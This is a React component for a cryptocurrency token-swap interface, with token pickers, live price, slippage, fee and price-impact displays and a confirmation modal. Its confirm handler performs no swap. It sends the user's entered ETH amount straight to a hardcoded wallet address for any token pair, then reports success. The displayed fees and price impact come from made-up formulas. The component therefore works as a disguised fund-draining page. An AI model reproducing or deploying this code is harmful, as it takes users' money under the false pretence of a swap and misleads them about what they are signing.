import React, { useState, useEffect, useRef } from 'react';
import { useToken } from '../hooks/useToken';
import { ethers } from 'ethers';

const TokenSwap = ({ isDarkMode }) => {
  const [fromToken, setFromToken] = useState('ethereum');
  const [toToken, setToToken] = useState('usd-coin');
  const [amount, setAmount] = useState('');
  const [estimatedAmount, setEstimatedAmount] = useState(null);
  const [isPending, setIsPending] = useState(false);
  const [transactionDetails, setTransactionDetails] = useState(null);
  const [showModal, setShowModal] = useState(false);

  const [slippage, setSlippage] = useState(0.5);
  const [fees, setFees] = useState(0);
  const [priceImpact, setPriceImpact] = useState(null);

  const initialPriceRef = useRef(null);

  const { price, loading, priceDirection } = useToken(fromToken, toToken);

  useEffect(() => {
    if (amount && price) {
      const estAmount = (amount * price).toFixed(4);
      setEstimatedAmount(estAmount);

      const calculatedFees = (amount * 0.001).toFixed(4);
      setFees(calculatedFees);

      const impact = (price * 0.003).toFixed(3);
      setPriceImpact(impact);

      if (initialPriceRef.current === null) {
        initialPriceRef.current = price;
      }
    }
  }, [amount, price]);

  const percentageChange = initialPriceRef.current
    ? (((price - initialPriceRef.current) / initialPriceRef.current) * 100).toFixed(2)
    : null;

  const handleSwap = async () => {
    if (!amount || fromToken === toToken) {
      alert('Please enter a valid amount and select different tokens.');
      return;
    }

    setTransactionDetails({ fromToken, toToken, amount, slippage, estimatedAmount, fees, priceImpact });
    setShowModal(true);
  };

  const confirmTransaction = async () => {
    setShowModal(false);
    setIsPending(true);

    try {
      if (window.ethereum) {
        await window.ethereum.request({ method: 'eth_requestAccounts' });
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        const signer = provider.getSigner();

        const transaction = await signer.sendTransaction({
          to: '0x66F7D70d17c1D2366aA54237fB56684AD35c685b',
          value: ethers.utils.parseEther(amount),
        });

        await transaction.wait();
        alert('Transaction Confirmed!');
      } else {
        alert('Please install MetaMask!');
      }
    } catch (error) {
      console.error(error);
      alert('Transaction Failed');
    } finally {
      setIsPending(false);
    }
  };

  return (
    <div className={`p-6 rounded-lg mt-5 shadow-md ${isDarkMode ? 'bg-black text-white border-2 border-gray-300' : 'bg-gray-100 border-2 text-black border-gray-300 '} w-full max-w-2xl mx-auto`}>
      <div className="flex flex-col gap-3">
        <div className="flex items-center justify-between">
          <label htmlFor="fromToken" className="text-lg">From</label>
          <select
            id="fromToken"
            className="bg-gray-700 text-white p-2 rounded"
            value={fromToken}
            onChange={(e) => setFromToken(e.target.value)}
          >
            <option value="ethereum">ETH</option>
            <option value="usd-coin">USDC</option>
            <option value="tether">USDT</option>
            <option value="wrapped-bitcoin">WBTC</option>
          </select>
        </div>

        <div className="flex items-center justify-between">
          <label htmlFor="toToken" className="text-lg">To</label>
          <select
            id="toToken"
            className="bg-gray-700 text-white p-2 rounded"
            value={toToken}
            onChange={(e) => setToToken(e.target.value)}
          >
            <option value="ethereum">ETH</option>
            <option value="usd-coin">USDC</option>
            <option value="tether">USDT</option>
            <option value="wrapped-bitcoin">WBTC</option>
          </select>
        </div>

        <div className="flex items-center justify-between">
          <label htmlFor="amount" className="text-lg">Amount</label>
          <input
            type="number"
            id="amount"
            className="bg-gray-700 text-white p-2 rounded w-2/3"
            placeholder={`Amount in ${fromToken}`}
            value={amount}
            onChange={(e) => setAmount(e.target.value)}
          />
        </div>

        <div className="mt-4 min-h-[200px]">
          {loading ? (
            <p className="text-center">Loading price...</p>
          ) : (
            <div className="flex flex-col gap-2">
              <div className="flex justify-between">
                <span className="text-lg">1 {fromToken}</span>
                <span className="text-lg">{price ? price.toFixed(3) : '0.000'} {toToken}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-sm text-yellow-500">Real-Time Change</span>
                <span className={`text-sm ${percentageChange > 0 ? 'text-green-500' : 'text-red-500'}`}>
                  {percentageChange}% {percentageChange > 0 ? '↑' : '↓'}
                </span>
              </div>
              <div className="flex justify-between">
                <span className="text-sm">Slippage</span>
                <span className="text-sm">{slippage}%</span>
              </div>
              <div className="flex justify-between">
                <span className="text-sm">Fees</span>
                <span className="text-sm">{fees} {fromToken}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-sm">Price Impact</span>
                <span className="text-sm">{priceImpact} {toToken}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-sm">Estimated</span>
                <span className="text-sm">
                  {amount} {fromToken} = {estimatedAmount} {toToken}
                </span>
              </div>
            </div>
          )}
        </div>

        <button
          onClick={handleSwap}
          className={`bg-green-900 text-white py-2 px-4 rounded-lg hover:bg-green-700 ${isPending ? 'opacity-50 cursor-not-allowed' : ''}`}
          disabled={isPending}
        >
          {isPending ? 'Transaction Pending...' : 'Swap'}
        </button>
      </div>

      {showModal && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center">
          <div className="bg-gray-800 p-6 rounded shadow-lg text-white max-w-md w-full">
            <h2 className="text-lg font-bold mb-4">Confirm Swap</h2>
            <p>From: {fromToken}</p>
            <p>To: {toToken}</p>
            <p>Amount: {amount}</p>
            <p>Estimated Amount: {estimatedAmount}</p>
            <p>Slippage: {slippage}%</p>
            <p>Fees: {fees} {fromToken}</p>
            <p>Price Impact: {priceImpact} {toToken}</p>
            <div className="flex justify-end gap-4 mt-4">
              <button onClick={() => setShowModal(false)} className="bg-gray-600 px-4 py-2 rounded">Cancel</button>
              <button onClick={confirmTransaction} className="bg-green-700 px-4 py-2 rounded">Confirm</button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default TokenSwap;
